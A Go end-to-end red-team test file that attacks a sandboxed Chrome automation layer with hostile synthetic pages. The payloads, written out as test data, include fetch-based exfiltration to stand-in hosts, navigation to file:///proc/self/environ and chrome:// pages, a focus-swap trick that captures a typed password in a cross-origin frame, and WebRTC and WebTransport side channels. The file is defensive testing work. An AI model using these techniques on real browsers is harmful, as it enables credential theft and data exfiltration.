//go:build e2e && chrome && linux

// Red-team attacks on the real Chrome for Testing (J1 task T27). Each
// test drives the production Pool and Page against a synthetic supplier
// site on 127.0.0.1 (two allowlisted, cross-site hosts mapped to it by the
// e2e flags) and hostile pages served by it:
//
//   - CDP port probing over the whole process tree (TCP4 and TCP6) with
//     pop-ups, cross-site frames, dedicated, shared and service workers
//     running;
//   - page scripts navigating the main frame and pop-ups to file://,
//     chrome://, javascript:, http:, IP literals and off-allowlist hosts;
//   - a shared worker starting a nested dedicated worker that fetches the
//     loopback server by IP literal (T13 review);
//   - a dedicated worker inside a cross-site out-of-process iframe;
//   - a supplier page swapping the focus to a cross-origin iframe while a
//     credential is typed;
//   - WebRTC (TURN over TCP, STUN) and WebTransport (QUIC) to IP literals,
//     which neither Fetch nor the resolver rules see.
//
// A test passes when the attack is defeated. A failing test whose comment
// starts with FINDING is a weakness for the implementer (never weakened
// here). Every value is synthetic; credentials are testsecrets canaries.
package browser_test

import (
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"slices"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/FlorianRuen/facto/internal/browser"
	"github.com/FlorianRuen/facto/internal/connector"
	"github.com/FlorianRuen/facto/internal/secret"
	"github.com/FlorianRuen/facto/internal/testsecrets"
)

const (
	// atkFrameHost is a second allowlisted host, cross-site from siteHost:
	// its frames run out of process (site isolation).
	atkFrameHost = "login.othersupplier.example"
	// atkOffHost is never allowlisted.
	atkOffHost = "evil.offlist.example"
)

var atkDomains = []string{siteHost, atkFrameHost}

// atkSite is the hostile synthetic site: one TLS server for both
// allowlisted hosts, a plain HTTP server, and raw TCP and UDP sinks that
// count every connection or datagram (the exfiltration targets).
type atkSite struct {
	t      *testing.T
	tls    *httptest.Server
	plain  *httptest.Server
	port   int
	caSPKI string

	tcpSink net.Listener
	udpSink net.PacketConn // STUN
	wtSink  net.PacketConn // WebTransport (QUIC)
	turnUDP net.PacketConn // TURN over UDP: answers 401 to get the USERNAME

	mu       sync.Mutex
	hits     map[string]int    // "<host>|<path>"
	got      map[string]string // /got?v= values by path (never printed)
	tcpConns int
	udpPkts  int
	wtPkts   int
	turnPkts int
	navTo    string   // /nav target (setNav)
	navHow   string   // "location", "open" or "frame"
	turnUser []string // USERNAME attributes received (never printed)
}

// jsString encodes v as a JavaScript string literal safe inside a
// <script> element (json.Marshal escapes <, > and &).
func jsString(v string) string {
	b, err := json.Marshal(v)
	if err != nil {
		panic(err) // a string always encodes
	}
	return string(b)
}

func newAtkSite(t *testing.T) *atkSite {
	t.Helper()
	s := &atkSite{t: t, hits: map[string]int{}, got: map[string]string{}}
	cert, spki := siteCertificate(t)
	s.caSPKI = spki
	s.tls = httptest.NewUnstartedServer(http.HandlerFunc(s.serve))
	s.tls.TLS = &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
	s.tls.StartTLS()
	t.Cleanup(s.tls.Close)
	s.port = s.tls.Listener.Addr().(*net.TCPAddr).Port //nolint:forcetypeassert // httptest listens on TCP
	s.plain = httptest.NewServer(http.HandlerFunc(s.serve))
	t.Cleanup(s.plain.Close)

	var lc net.ListenConfig
	ln, err := lc.Listen(t.Context(), "tcp4", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = ln.Close() })
	s.tcpSink = ln
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			s.mu.Lock()
			s.tcpConns++
			s.mu.Unlock()
			_ = c.Close()
		}
	}()
	s.udpSink = s.packetSink(t, &s.udpPkts)
	s.wtSink = s.packetSink(t, &s.wtPkts)
	s.turnUDP = s.turnSink(t)
	return s
}

// STUN/TURN constants (RFC 5389, RFC 5766).
const (
	stunMagic          = 0x2112A442
	stunAllocate       = 0x0003
	stunAllocateErr    = 0x0113
	stunAttrUsername   = 0x0006
	stunAttrErrorCode  = 0x0009
	stunAttrRealm      = 0x0014
	stunAttrNonce      = 0x0015
	stunHeaderSize     = 20
	stunMaxDatagram    = 2048
	stunUnauthorized   = 401
	stunAttrHeaderSize = 4
)

// turnSink is a minimal TURN server on a UDP port of 127.0.0.1: it counts
// datagrams, answers an Allocate without USERNAME with 401 (REALM, NONCE)
// as RFC 5766 requires, and records the USERNAME of the retried Allocate.
// That USERNAME is chosen by the page: a channel for any data.
func (s *atkSite) turnSink(t *testing.T) net.PacketConn {
	t.Helper()
	var lc net.ListenConfig
	pc, err := lc.ListenPacket(t.Context(), "udp4", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = pc.Close() })
	go func() {
		buf := make([]byte, stunMaxDatagram)
		for {
			n, from, err := pc.ReadFrom(buf)
			if err != nil {
				return
			}
			s.mu.Lock()
			s.turnPkts++
			s.mu.Unlock()
			msg := buf[:n]
			if n < stunHeaderSize || binary.BigEndian.Uint32(msg[4:8]) != stunMagic ||
				binary.BigEndian.Uint16(msg[0:2]) != stunAllocate {
				continue
			}
			if user, ok := stunAttr(msg, stunAttrUsername); ok {
				s.mu.Lock()
				s.turnUser = append(s.turnUser, string(user))
				s.mu.Unlock()
				continue
			}
			_, _ = pc.WriteTo(stunUnauthorizedReply(msg[8:20]), from)
		}
	}()
	return pc
}

// stunAttr returns the value of the first attribute typ of msg.
func stunAttr(msg []byte, typ uint16) ([]byte, bool) {
	body := msg[stunHeaderSize:]
	for len(body) >= stunAttrHeaderSize {
		at := binary.BigEndian.Uint16(body[0:2])
		l := int(binary.BigEndian.Uint16(body[2:4]))
		if stunAttrHeaderSize+l > len(body) {
			return nil, false
		}
		if at == typ {
			return body[stunAttrHeaderSize : stunAttrHeaderSize+l], true
		}
		adv := stunAttrHeaderSize + (l+3)&^3
		if adv > len(body) {
			return nil, false
		}
		body = body[adv:]
	}
	return nil, false
}

// stunUnauthorizedReply builds an Allocate error response 401 with REALM
// and NONCE for transaction txid.
func stunUnauthorizedReply(txid []byte) []byte {
	attr := func(typ uint16, v []byte) []byte {
		b := make([]byte, stunAttrHeaderSize, stunAttrHeaderSize+len(v)+3)
		binary.BigEndian.PutUint16(b[0:2], typ)
		binary.BigEndian.PutUint16(b[2:4], uint16(len(v))) //nolint:gosec // short constant values
		b = append(b, v...)
		for len(b)%4 != 0 {
			b = append(b, 0)
		}
		return b
	}
	code := []byte{0, 0, stunUnauthorized / 100, stunUnauthorized % 100}
	code = append(code, "Unauthorized"...)
	var attrs []byte
	attrs = append(attrs, attr(stunAttrErrorCode, code)...)
	attrs = append(attrs, attr(stunAttrRealm, []byte("synthetic.realm"))...)
	attrs = append(attrs, attr(stunAttrNonce, []byte("synthetic-nonce-0001"))...)
	h := make([]byte, stunHeaderSize, stunHeaderSize+len(attrs))
	binary.BigEndian.PutUint16(h[0:2], stunAllocateErr)
	binary.BigEndian.PutUint16(h[2:4], uint16(len(attrs))) //nolint:gosec // a few dozen bytes
	binary.BigEndian.PutUint32(h[4:8], stunMagic)
	copy(h[8:20], txid)
	return append(h, attrs...)
}

func (s *atkSite) turnPort() int { return s.turnUDP.LocalAddr().(*net.UDPAddr).Port } //nolint:forcetypeassert // udp4

// packetSink listens on a UDP port of 127.0.0.1 and counts datagrams in n.
func (s *atkSite) packetSink(t *testing.T, n *int) net.PacketConn {
	t.Helper()
	var lc net.ListenConfig
	pc, err := lc.ListenPacket(t.Context(), "udp4", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = pc.Close() })
	go func() {
		buf := make([]byte, 2048)
		for {
			if _, _, err := pc.ReadFrom(buf); err != nil {
				return
			}
			s.mu.Lock()
			*n++
			s.mu.Unlock()
		}
	}()
	return pc
}

func (s *atkSite) tcpPort() int { return s.tcpSink.Addr().(*net.TCPAddr).Port }      //nolint:forcetypeassert // tcp4
func (s *atkSite) udpPort() int { return s.udpSink.LocalAddr().(*net.UDPAddr).Port } //nolint:forcetypeassert // udp4
func (s *atkSite) wtPort() int  { return s.wtSink.LocalAddr().(*net.UDPAddr).Port }  //nolint:forcetypeassert // udp4
func (s *atkSite) plainPort() int {
	return s.plain.Listener.Addr().(*net.TCPAddr).Port //nolint:forcetypeassert // httptest listens on TCP
}

// hitsWhere counts the requests whose host and path satisfy match.
func (s *atkSite) hitsWhere(match func(host, path string) bool) int {
	s.mu.Lock()
	defer s.mu.Unlock()
	n := 0
	for k, v := range s.hits {
		h, p, _ := strings.Cut(k, "|")
		if match(h, p) {
			n += v
		}
	}
	return n
}

func (s *atkSite) leaks() int {
	return s.hitsWhere(func(h, p string) bool {
		hostOnly := h
		if hh, _, err := net.SplitHostPort(h); err == nil {
			hostOnly = hh
		}
		return p == "/leak" || (hostOnly != siteHost && hostOnly != atkFrameHost)
	})
}

// setNav sets what the next /nav page does.
func (s *atkSite) setNav(how, to string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.navHow, s.navTo = how, to
}

func (s *atkSite) sinks() (tcp, stun, wt int) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.tcpConns, s.udpPkts, s.wtPkts
}

func (s *atkSite) serve(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	s.hits[r.Host+"|"+r.URL.Path]++
	if r.URL.Path == "/got" {
		s.got[r.URL.Path] += r.URL.Query().Get("v")
	}
	s.mu.Unlock()
	html := func(body string) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_, _ = io.WriteString(w, "<!doctype html><meta charset=\"utf-8\"><title>facto attack</title><body>"+body+"</body>")
	}
	js := func(src string) {
		w.Header().Set("Content-Type", "text/javascript")
		_, _ = io.WriteString(w, src)
	}
	leak := fmt.Sprintf("https://127.0.0.1:%d/leak", s.port)
	switch r.URL.Path {
	case "/":
		html(`<p id="ready">ready</p>`)
	case "/nav":
		// Tries one navigation of the main frame (or a pop-up or a frame)
		// set by the test with setNav (never read from the request), then
		// marks the page if it is still there.
		s.mu.Lock()
		to, how := s.navTo, s.navHow
		s.mu.Unlock()
		html(fmt.Sprintf(`<p id="ready">ready</p><input id="pass" type="password"><script>
const to = %s, how = %s;
setTimeout(() => {
  try {
    if (how === "open") { window.open(to, "_blank"); }
    else if (how === "frame") { const f = document.createElement("iframe"); f.src = to; document.body.appendChild(f); }
    else { location.href = to; }
  } catch (e) {}
  setTimeout(() => { const p = document.createElement("p"); p.id = "stayed"; p.textContent = "stayed"; document.body.appendChild(p); }, 1500);
}, 50);
</script>`, jsString(to), jsString(how)))
	case "/shared":
		html(`<script>
const seen = new Set();
function mark(v) { seen.add(v); if (seen.has("shared-settled") && [...seen].some((x) => x.startsWith("nested-"))) done(); }
function done() { if (document.getElementById("done")) return;
  const p = document.createElement("p"); p.id = "done"; p.className = [...seen].join(" "); p.textContent = "done"; document.body.appendChild(p); }
try {
  const sw = new SharedWorker("/shared.js");
  sw.port.onmessage = (e) => mark(e.data);
  sw.onerror = () => { mark("shared-error"); done(); };
  sw.port.start();
} catch (e) { mark("shared-unsupported"); done(); }
setTimeout(done, 8000);
</script>`)
	case "/shared.js":
		js(fmt.Sprintf(`onconnect = (e) => {
  const port = e.ports[0];
  try {
    const n = new Worker("/shared-nested.js");
    n.onmessage = (ev) => port.postMessage("nested-" + ev.data);
    n.onerror = () => port.postMessage("nested-error");
  } catch (err) { port.postMessage("nested-unsupported"); }
  Promise.allSettled([fetch(%q + "?from=shared"), fetch("https://shared.offlist.example/x")])
    .then(() => port.postMessage("shared-settled"));
};`, leak))
	case "/shared-nested.js":
		js(fmt.Sprintf(`Promise.allSettled([fetch(%q + "?from=shared-nested"), fetch("https://sharednested.offlist.example/x"),
  fetch("http://127.0.0.1:%d/leak?from=shared-nested-plain")]).then(() => postMessage("settled"));`, leak, s.plainPort()))
	case "/oopif":
		html(fmt.Sprintf(`<script>
addEventListener("message", (e) => { const p = document.createElement("p"); p.id = "done"; p.className = String(e.data); p.textContent = "done"; document.body.appendChild(p); });
</script><iframe src="https://%s/frame"></iframe>`, atkFrameHost))
	case "/frame":
		html(`<p>frame</p><script>
const w = new Worker("/frame-worker.js");
w.onmessage = (e) => parent.postMessage("frame-" + e.data, "*");
w.onerror = () => parent.postMessage("frame-worker-error", "*");
</script>`)
	case "/frame-worker.js":
		js(fmt.Sprintf(`const n = new Worker("/frame-nested.js");
let got = 0; const done = () => { if (++got === 2) postMessage("settled"); };
n.onmessage = done; n.onerror = done;
Promise.allSettled([fetch(%q + "?from=oopif-worker"), fetch("https://oopifworker.offlist.example/x")]).then(done);`, leak))
	case "/frame-nested.js":
		js(fmt.Sprintf(`Promise.allSettled([fetch(%q + "?from=oopif-nested"), fetch("https://oopifnested.offlist.example/x")]).then(() => postMessage("settled"));`, leak))
	case "/swap":
		// The supplier page moves the focus to a cross-origin frame shortly
		// after the password field gets it (delay in ms from the query).
		html(fmt.Sprintf(`<input id="pass" type="password"><iframe id="f" src="https://%s/catch"></iframe><script>
const d = Number(new URLSearchParams(location.search).get("d") || "0");
const f = document.getElementById("f");
let ready = false;
addEventListener("message", (e) => { if (e.data === "ready") { ready = true; const p = document.createElement("p"); p.id = "ready"; p.textContent = "ready"; document.body.appendChild(p); } });
document.getElementById("pass").addEventListener("focus", () => {
  setTimeout(() => { f.focus(); f.contentWindow.postMessage("grab", "*"); }, d);
});
</script>`, atkFrameHost))
	case "/catch":
		html(`<input id="grab"><script>
const g = document.getElementById("grab");
addEventListener("message", (e) => { if (e.data === "grab") g.focus(); });
g.addEventListener("input", () => { fetch("/got?v=" + encodeURIComponent(g.value)); });
parent.postMessage("ready", "*");
</script>`)
	case "/rtc":
		html(fmt.Sprintf(`<script>
const out = new Set();
function done(v) { out.add(v); if (document.getElementById("done")) return;
  if (out.size < 3 && v !== "timeout") return;
  const p = document.createElement("p"); p.id = "done"; p.className = [...out].join(" "); p.textContent = "done"; document.body.appendChild(p); }
function gather(name, servers, policy) {
  try {
    const pc = new RTCPeerConnection({iceServers: servers, iceTransportPolicy: policy});
    pc.createDataChannel("x");
    pc.onicegatheringstatechange = () => { if (pc.iceGatheringState === "complete") done(name + "-complete"); };
    pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => done(name + "-error"));
  } catch (e) { done(name + "-unsupported"); }
}
gather("turn", [{urls: ["turn:127.0.0.1:%[1]d?transport=tcp"], username: "u", credential: "p"}], "relay");
gather("stun", [{urls: ["stun:127.0.0.1:%[2]d"]}], "all");
const exfil = new URLSearchParams(location.search).get("u") || "none";
gather("turnudp", [{urls: ["turn:127.0.0.1:%[3]d?transport=udp"], username: exfil, credential: "p"}], "relay");
setTimeout(() => done("timeout"), 8000);
</script>`, s.tcpPort(), s.udpPort(), s.turnPort()))
	case "/wt":
		html(fmt.Sprintf(`<script>
function done(v) { if (document.getElementById("done")) return;
  const p = document.createElement("p"); p.id = "done"; p.className = v; p.textContent = "done"; document.body.appendChild(p); }
try {
  const wt = new WebTransport("https://127.0.0.1:%d/wt", {serverCertificateHashes: [{algorithm: "sha-256", value: new Uint8Array(32)}]});
  wt.ready.then(() => done("wt-open")).catch(() => done("wt-failed"));
} catch (e) { done("wt-unsupported"); }
setTimeout(() => done("timeout"), 8000);
</script>`, s.wtPort()))
	default:
		http.NotFound(w, r)
	}
}

// atkRig is a real-Chrome pool whose starter swaps the release argv for
// the e2e argv mapping both allowlisted hosts to the attack site.
func atkRig(t *testing.T, s *atkSite) *chromeRig {
	t.Helper()
	return newChromeRig(t, func(r *chromeRig) browser.Starter {
		return func(ctx context.Context, cmd browser.Command) (browser.Process, error) {
			profile, ok := argValue(cmd.Args, "--user-data-dir=")
			if !ok {
				return nil, errors.New("attack starter: no --user-data-dir")
			}
			args, err := browser.FlagsE2E(browser.Options{
				ProfileDir:     profile,
				AllowedDomains: atkDomains,
				Visible:        !slices.Contains(cmd.Args, headlessFlag),
				AllowProxy:     !slices.Contains(cmd.Args, "--no-proxy-server"),
			}, browser.E2EOverrides{LoopbackHosts: atkDomains, LoopbackPort: s.port, TestCASPKI: []string{s.caSPKI}})
			if err != nil {
				return nil, fmt.Errorf("attack starter: %w", err)
			}
			cmd.Args = args
			p, err := browser.StartPipeProcess(ctx, cmd)
			if err != nil {
				return nil, err
			}
			r.record(p.Pid())
			return p, nil
		}
	})
}

func atkLaunch(ctx context.Context, t *testing.T, r *chromeRig) *browser.PoolBrowser {
	t.Helper()
	b, err := r.pool.Launch(ctx, connector.LaunchOptions{AllowedDomains: atkDomains})
	if err != nil {
		t.Fatalf("Launch real Chrome: %v", err)
	}
	pb := b.(*browser.PoolBrowser) //nolint:forcetypeassert // the pool's own type
	closeAtCleanup(t, pb)
	return pb
}

func atkOpen(ctx context.Context, t *testing.T, b *browser.PoolBrowser, path, selector string) error {
	t.Helper()
	return atkOpenWithin(ctx, t, b, path, selector, 30*time.Second)
}

func atkOpenWithin(ctx context.Context, t *testing.T, b *browser.PoolBrowser, path, selector string, within time.Duration) error {
	t.Helper()
	if err := b.Navigate(ctx, "https://"+siteHost+path); err != nil {
		t.Fatalf("Navigate %s: %v", path, err)
	}
	wctx, cancel := context.WithTimeout(ctx, within)
	defer cancel()
	return b.WaitVisible(wctx, selector)
}

// ------------------------------------------------------------ tests

// TestAttack_ChromeNoCDPListenerAnywhereInTree: with a pop-up, a
// cross-site frame, dedicated, nested and shared workers running, no
// process of Chrome's tree holds a listening TCP socket (TCP4 or TCP6),
// none passes a debugging port switch, and no DevToolsActivePort exists.
func TestAttack_ChromeNoCDPListenerAnywhereInTree(t *testing.T) {
	t.Parallel()
	ctx, cancel := context.WithTimeout(t.Context(), 2*e2eTimeout)
	defer cancel()
	s := newAtkSite(t)
	r := atkRig(t, s)
	b := atkLaunch(ctx, t, r)
	if err := atkOpen(ctx, t, b, "/oopif", "#done"); err != nil {
		t.Fatalf("cross-site frame page did not settle: %v", err)
	}
	root := browserPidByProfile(t, b.ProfileDir())
	probe := func(stage string) {
		res, err := probeTree(t, root)
		if err != nil {
			t.Fatalf("%s: probe: %v", stage, err)
		}
		if res.sockets == 0 || len(res.pids) < 3 {
			t.Fatalf("%s: probe saw %d sockets in %d pids: blind", stage, res.sockets, len(res.pids))
		}
		for _, l := range res.listening {
			t.Errorf("%s: listening socket in Chrome's tree: %v", stage, l)
		}
		for _, pid := range res.pids {
			for _, a := range cmdline(pid) {
				if strings.HasPrefix(a, "--remote-debugging-port") || strings.HasPrefix(a, "--remote-debugging-address") ||
					strings.HasPrefix(a, "--remote-debugging-socket") {
					t.Errorf("%s: pid %d argv has %q", stage, pid, a)
				}
			}
		}
		for _, f := range filesNamed(t, b.ProfileDir(), "DevToolsActivePort") {
			t.Errorf("%s: profile holds %s", stage, f)
		}
	}
	probe("cross-site frame and workers")
	if err := atkOpen(ctx, t, b, "/shared", "#done"); err != nil {
		t.Fatalf("shared worker page did not settle: %v", err)
	}
	probe("shared worker")
	s.setNav("open", "https://"+atkFrameHost+"/")
	if err := atkOpen(ctx, t, b, "/nav", "#stayed"); err != nil {
		t.Fatalf("pop-up page did not settle: %v", err)
	}
	probe("pop-up")
	if !t.Failed() {
		t.Log("no listening CDP port")
	}
}

// TestAttack_ChromePageScriptNavigationEscapes: a page script sending the
// main frame, a pop-up or an iframe to file://, chrome://, a javascript:
// URL, http:, IP literals or an off-allowlist host never loads it: no
// request reaches a non-allowlisted origin, the page URL never becomes a
// local or privileged scheme or a non-allowlisted origin, and TypeSecret
// refuses whatever is left.
func TestAttack_ChromePageScriptNavigationEscapes(t *testing.T) {
	t.Parallel()
	ctx, cancel := context.WithTimeout(t.Context(), 4*e2eTimeout)
	defer cancel()
	s := newAtkSite(t)
	r := atkRig(t, s)
	targets := []string{
		"file:///etc/hostname",
		"file:///proc/self/environ",
		"chrome://settings/passwords",
		"chrome://version",
		"chrome://net-internals",
		"devtools://devtools/bundled/inspector.html",
		"view-source:https://" + siteHost + "/",
		fmt.Sprintf("http://127.0.0.1:%d/leak", s.plainPort()),
		fmt.Sprintf("https://127.0.0.1:%d/leak", s.port),
		fmt.Sprintf("https://[::ffff:7f00:1]:%d/leak", s.port),
		fmt.Sprintf("https://2130706433:%d/leak", s.port),
		"http://" + siteHost + "/leak",
		"https://" + atkOffHost + "/leak",
		"javascript:void(fetch('https://" + atkOffHost + "/leak'))",
		"data:text/html,<script>fetch('https://" + atkOffHost + "/leak')</script>",
	}
	pass := testsecrets.Canary(t, testsecrets.Password)
	for _, how := range []string{"location", "open", "frame"} {
		for _, to := range targets {
			b := atkLaunch(ctx, t, r)
			s.setNav(how, to)
			err := atkOpenWithin(ctx, t, b, "/nav", "#stayed", 8*time.Second)
			cur, cerr := b.CurrentURL(ctx)
			if cerr != nil {
				t.Errorf("%s %s: CurrentURL: %v", how, to, cerr)
			}
			u, perr := url.Parse(cur)
			allowed := perr == nil && u.Scheme == "https" && slices.Contains(atkDomains, u.Hostname())
			switch {
			case err == nil && !allowed:
				t.Errorf("%s %s: page still answers but URL %q is not allowlisted", how, to, cur)
			case err != nil && allowed:
				t.Errorf("%s %s: page vanished yet URL %q stayed allowlisted: %v", how, to, cur, err)
			}
			if err != nil {
				t.Logf("%s %s: page left, target URL now %q", how, to, cur)
			}
			if !allowed {
				sec := secret.FromString(pass)
				if terr := b.TypeSecret(ctx, "#pass", sec); terr == nil {
					t.Errorf("%s %s: TypeSecret succeeded on %q", how, to, cur)
				}
				sec.Wipe()
			}
			_ = b.Close()
		}
	}
	if n := s.leaks(); n != 0 {
		t.Errorf("%d requests reached a non-allowlisted origin or /leak", n)
	}
	if blocked := s.hitsWhere(func(h, _ string) bool { return strings.HasPrefix(h, "127.0.0.1") }); blocked != 0 {
		t.Errorf("%d requests reached the site by IP literal", blocked)
	}
}

// TestAttack_ChromeSharedWorkerNestedWorkerFetchBlocked (T13 review): a
// shared worker of the login page starts a nested dedicated worker; both
// fetch the loopback server by IP literal and an off-allowlist host.
// Nothing may reach /leak.
//
// FINDING (expected, T13 review): shared_worker sessions get no
// Target.setAutoAttach (fetch.go onAttached: nested is page, iframe and
// worker only), so a nested dedicated worker of a shared worker is never
// attached nor paused; if its requests are not intercepted by the shared
// worker's Fetch, IP-literal requests bypass both Fetch and the resolver
// rules. The failure message below tells which of those happened.
func TestAttack_ChromeSharedWorkerNestedWorkerFetchBlocked(t *testing.T) {
	t.Parallel()
	ctx, cancel := context.WithTimeout(t.Context(), 2*e2eTimeout)
	defer cancel()
	s := newAtkSite(t)
	r := atkRig(t, s)
	b := atkLaunch(ctx, t, r)
	if err := atkOpen(ctx, t, b, "/shared", "#done"); err != nil {
		t.Fatalf("shared worker page did not settle: %v", err)
	}
	var state []string
	for _, cls := range []string{"shared-settled", "nested-settled", "nested-error", "nested-unsupported", "shared-error", "shared-unsupported"} {
		cctx, ccancel := context.WithTimeout(ctx, 2*time.Second)
		if b.WaitVisible(cctx, "#done."+cls) == nil {
			state = append(state, cls)
		}
		ccancel()
	}
	t.Logf("shared worker page state: %v; blocked hosts: %v", state, b.BlockedHosts())
	if n := s.hitsWhere(func(_, p string) bool { return p == "/leak" }); n != 0 {
		t.Errorf("FINDING: %d requests from the shared worker or its nested worker reached the loopback server by IP literal (state %v)", n, state)
	}
	if n := s.leaks(); n != 0 {
		t.Errorf("%d requests reached a non-allowlisted origin", n)
	}
}

// TestAttack_ChromeDedicatedWorkerInCrossSiteOOPIFBlocked (T13 review): a
// dedicated worker, and its nested worker, inside a cross-site
// out-of-process iframe fetch the loopback server by IP literal and an
// off-allowlist host: every such request is blocked and counted.
func TestAttack_ChromeDedicatedWorkerInCrossSiteOOPIFBlocked(t *testing.T) {
	t.Parallel()
	ctx, cancel := context.WithTimeout(t.Context(), 2*e2eTimeout)
	defer cancel()
	s := newAtkSite(t)
	r := atkRig(t, s)
	b := atkLaunch(ctx, t, r)
	if err := atkOpen(ctx, t, b, "/oopif", "#done.frame-settled"); err != nil {
		t.Fatalf("OOPIF worker did not report (closed because unenforceable?): %v; blocked %v", err, b.BlockedHosts())
	}
	if s.hitsWhere(func(h, p string) bool { return strings.HasPrefix(h, atkFrameHost) && p == "/frame-nested.js" }) == 0 {
		t.Error("the nested worker of the OOPIF worker never started (the test proves nothing about it)")
	}
	if n := s.hitsWhere(func(_, p string) bool { return p == "/leak" }); n != 0 {
		t.Errorf("%d requests from the OOPIF worker tree reached the loopback server by IP literal", n)
	}
	blocked := b.BlockedHosts()
	for _, h := range []string{"oopifworker.offlist.example", "oopifnested.offlist.example"} {
		if blocked[h] < 1 {
			t.Errorf("BlockedHosts[%q] = %d, want the request counted (%v)", h, blocked[h], blocked)
		}
	}
	if blocked["127.0.0.1"] < 2 {
		t.Errorf("BlockedHosts[127.0.0.1] = %d, want the 2 IP-literal requests", blocked["127.0.0.1"])
	}
}

// TestAttack_ChromeFocusSwapToCrossOriginFrame: the login page moves the
// focus from the password field to a cross-origin (allowlisted) iframe a
// few milliseconds after facto focuses it, hoping to catch the typed
// password there. For each delay, either TypeSecret refuses (before or
// after typing) or the frame received nothing.
//
// Residual by design (ADR 0008 "Secret typing"): a swap landing between
// the pre-typing check and Input.insertText is detected after the fact
// (ErrTypeRefused), but the frame may already hold the value. The test
// fails with a FINDING line if a frame ever received it while TypeSecret
// reported success.
func TestAttack_ChromeFocusSwapToCrossOriginFrame(t *testing.T) {
	t.Parallel()
	ctx, cancel := context.WithTimeout(t.Context(), 4*e2eTimeout)
	defer cancel()
	s := newAtkSite(t)
	r := atkRig(t, s)
	pass := testsecrets.Canary(t, testsecrets.Password)
	caught, refused := 0, 0
	for d := range 12 {
		b := atkLaunch(ctx, t, r)
		if err := atkOpen(ctx, t, b, fmt.Sprintf("/swap?d=%d", d*2), "#ready"); err != nil {
			t.Fatalf("swap page (d=%d) not ready: %v", d*2, err)
		}
		s.mu.Lock()
		before := s.got["/got"]
		s.mu.Unlock()
		sec := secret.FromString(pass)
		err := b.TypeSecret(ctx, "#pass", sec)
		sec.Wipe()
		// Let the frame's input handler report.
		cctx, ccancel := context.WithTimeout(ctx, 500*time.Millisecond)
		_ = b.WaitVisible(cctx, "#never-there")
		ccancel()
		s.mu.Lock()
		leaked := strings.Contains(strings.TrimPrefix(s.got["/got"], before), pass)
		s.mu.Unlock()
		if err != nil {
			refused++
			if !errors.Is(err, browser.ErrTypeRefused) && !errors.Is(err, browser.ErrNotVisible) {
				t.Errorf("d=%d: TypeSecret = %v, want ErrTypeRefused", d*2, err)
			}
		}
		if leaked {
			caught++
			if err == nil {
				t.Errorf("FINDING: d=%d: the cross-origin frame received the typed password and TypeSecret reported success", d*2)
			}
		}
		_ = b.Close()
	}
	t.Logf("focus swap: %d of 12 attempts refused, %d delivered the value to the frame (each detected)", refused, caught)
	if n := s.leaks(); n != 0 {
		t.Errorf("%d requests reached a non-allowlisted origin", n)
	}
}

// TestAttack_ChromeFocusSwapNeverDeliversToCrossOriginFrame: the strict
// form of the focus-swap attack. The typed password must never reach a
// frame of another origin, detected or not.
//
// FINDING: LOW (cat 1/3). TypeSecret checks the focus, then sends
// Input.insertText, then checks again: a page timer that moves the focus to
// a cross-origin iframe between the first check and insertText gets the
// password typed into the frame. TypeSecret then returns ErrTypeRefused
// (the login stops), but the frame's origin already holds the value and
// can send it to its own (allowlisted) host. Bounded by the allowlist
// (Fetch blocks every other host), hence LOW. Observed on Chrome for
// Testing 156: 2 of 12 attempts delivered with swap delays of 0 to 22 ms
// with the other real-Chrome tests running in parallel, 0 of 60 with one
// browser at a time: the race is real but load dependent, so this test
// runs six browsers at once, 10 attempts each, each stopping at its first
// delivery (a run here: 4 of the 6 workers got the password delivered to
// the frame, at swap delays of 8 to 18 ms, every time detected).
// Reproduce: make chrome, then
//
//	FACTO_E2E_CHROME=$(pwd)/.cache/chrome/<version>/chrome-linux64/chrome \
//	  go test -tags e2e,chrome -count=1 -run TestAttack_ChromeFocusSwapNeverDeliversToCrossOriginFrame -v ./internal/browser/
//
// Fix direction (implementer, test-first): close the window, for example
// by suspending page script execution (Emulation.setScriptExecutionDisabled
// on the page and its frames, or a debugger pause) from the pre-typing
// check until insertText has returned, then checking again.
func TestAttack_ChromeFocusSwapNeverDeliversToCrossOriginFrame(t *testing.T) {
	t.Parallel()
	ctx, cancel := context.WithTimeout(t.Context(), 8*e2eTimeout)
	t.Cleanup(cancel) // the parallel subtests run after this function returns
	s := newAtkSite(t)
	r := atkRig(t, s)
	typed := testsecrets.Canary(t, testsecrets.Password)
	// Six browsers at once: the window opens under load (it was observed
	// with the other real-Chrome tests running in parallel).
	const workers, perWorker = 6, 10
	for w := range workers {
		t.Run(fmt.Sprintf("worker-%d", w), func(t *testing.T) {
			t.Parallel()
			mine := typed + "-" + strconv.Itoa(w)
			for i := range perWorker {
				d := ((w*perWorker + i) % 12) * 2
				b := atkLaunch(ctx, t, r)
				if err := atkOpen(ctx, t, b, fmt.Sprintf("/swap?d=%d&w=%d", d, w), "#ready"); err != nil {
					t.Fatalf("swap page (d=%d) not ready: %v", d, err)
				}
				sec := secret.FromString(mine)
				err := b.TypeSecret(ctx, "#pass", sec)
				sec.Wipe()
				cctx, ccancel := context.WithTimeout(ctx, 500*time.Millisecond)
				_ = b.WaitVisible(cctx, "#never-there")
				ccancel()
				s.mu.Lock()
				leaked := strings.Contains(s.got["/got"], mine)
				s.mu.Unlock()
				_ = b.Close()
				if leaked {
					t.Fatalf("FINDING: attempt %d (swap delay %d ms): the cross-origin frame received the typed password (TypeSecret = %v)", i+1, d, err)
				}
			}
		})
	}
}

// TestAttack_ChromeWebRTCToIPLiteral: WebRTC ICE gathering against a
// TURN-over-TCP server, a STUN server and a TURN-over-UDP server on
// 127.0.0.1 by IP literal (no Fetch interception, no resolver rule). The
// TURN USERNAME is chosen by the page: here a canary standing for a value
